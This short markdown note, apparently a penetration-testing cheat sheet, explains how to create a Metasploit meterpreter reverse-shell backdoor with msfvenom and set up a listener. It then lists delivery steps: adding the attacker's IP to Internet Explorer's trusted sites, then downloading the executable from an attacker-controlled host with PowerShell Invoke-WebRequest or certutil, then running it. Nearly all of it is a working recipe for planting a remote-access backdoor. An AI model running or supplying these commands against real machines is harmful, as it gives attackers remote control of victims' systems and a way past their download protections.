# Persistence with Metasploit

## msfvenom backdoor
You can use Metasploit's msfvenom payload generator to create a .exe containing a backdoor for your IP and LPORT.

1. Create the payload using:
	
	msfvenom -p windows/meterpreter/reverse_tcp <LHOST> <LPORT> -f exe > backdoor.exe

2. Create a metasploit listener (or nc if you prefer) using:

	msfconsole -q

### In-Browser HTTP Delivery

1. Configure your machine as a trusted website:

	1. On the target machine, go to internet explorer and choose "internet options".
	2. Click on the "Security" tab, select "Trusted Sites" and then click on the "Sites" button. Fill the "Add this website to the zone" field with your IP address and click the "Add" button.
	3. After adding your IP to the trusted websites you can close that tab, and then click OK.

2. Using a python simple HTTP server deliver the backdoor to the system that you previously logged into

3. Download and run the backdoor 

### Powershell HTTP Delivery

1. Another delivery method would be using Powershell. Open a Powershell window and download the backdoor using the following command: 

	Invoke-WebRequest http://10.x.x.x/backdoor.exe

### Powershell CertUtil Delivery

1. You can use certutil to download the backdoor. You can use certutil from both windows command line and Powershell commandline. The command to download the file is: 

	certutil -urlcache -split -f http://10.x.x.x/backdoor.exe

## Executing the backdoor

To execute the backdoor type .\backdoor.exe
